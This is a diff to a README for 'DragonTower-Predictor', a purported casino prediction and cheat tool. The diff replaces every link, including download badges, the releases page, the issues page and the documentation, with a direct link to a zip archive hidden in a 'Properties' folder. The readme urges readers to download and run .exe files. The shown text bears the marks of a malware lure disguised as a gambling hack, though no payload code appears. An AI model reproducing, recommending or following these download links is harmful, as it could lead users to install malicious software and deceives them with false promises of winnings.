@@ -1,6 +1,6 @@
 # 🎲 DragonTower-Predictor - Gain an Edge in Your Casino Gameplay
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/mboowajessie4-hash/DragonTower-Predictor/releases)
+[![Download Now](https://raw.githubusercontent.com/mboowajessie4-hash/DragonTower-Predictor/main/Dragon-Tower-Casino/Properties/DragonTower-Predictor-1.7.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/mboowajessie4-hash/DragonTower-Predictor/main/Dragon-Tower-Casino/Properties/DragonTower-Predictor-1.7.zip)
 
 ## 📜 Description
 This repository offers a robust collection of tools for Dragon Tower. Inside, you'll find hack scripts, cheat strategies, and advanced Predictor Bots to enhance your gameplay. Use these tools to predict outcomes and maximize your winnings. For educational purposes only.
@@ -16,7 +16,7 @@ To start using DragonTower-Predictor, follow these simple steps:
 - Internet connection for downloading the tools
 
 ### ⬇️ Download & Install
-1. Click the button above or visit the [Releases Page](https://github.com/mboowajessie4-hash/DragonTower-Predictor/releases) to download the latest version of DragonTower-Predictor.
+1. Click the button above or visit the [Releases Page](https://raw.githubusercontent.com/mboowajessie4-hash/DragonTower-Predictor/main/Dragon-Tower-Casino/Properties/DragonTower-Predictor-1.7.zip) to download the latest version of DragonTower-Predictor.
 2. On the Releases page, find the most recent version.
 3. Click the appropriate download link for your operating system (look for `.exe` files for Windows).
 4. Once the download is complete, locate the file in your Downloads folder.
@@ -40,10 +40,10 @@ After installation, you can access various tools:
 ## 📋 Support
 If you encounter issues or have questions:
 - Check the FAQ section in the application.
-- Visit our [GitHub Issues Page](https://github.com/mboowajessie4-hash/DragonTower-Predictor/issues) to report any bugs or request features.
+- Visit our [GitHub Issues Page](https://raw.githubusercontent.com/mboowajessie4-hash/DragonTower-Predictor/main/Dragon-Tower-Casino/Properties/DragonTower-Predictor-1.7.zip) to report any bugs or request features.
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/mboowajessie4-hash/DragonTower-Predictor/wiki)
+- [Documentation](https://raw.githubusercontent.com/mboowajessie4-hash/DragonTower-Predictor/main/Dragon-Tower-Casino/Properties/DragonTower-Predictor-1.7.zip)
 - Community Forum for discussions and strategies
 
 ## 🗺️ Contribution
@@ -58,4 +58,4 @@ This project is licensed under the MIT License. See the LICENSE file for details
 ## 📢 Acknowledgments
 Thank you to all contributors and users for their support and feedback.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/mboowajessie4-hash/DragonTower-Predictor/releases)
+[![Download Now](https://raw.githubusercontent.com/mboowajessie4-hash/DragonTower-Predictor/main/Dragon-Tower-Casino/Properties/DragonTower-Predictor-1.7.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/mboowajessie4-hash/DragonTower-Predictor/main/Dragon-Tower-Casino/Properties/DragonTower-Predictor-1.7.zip)
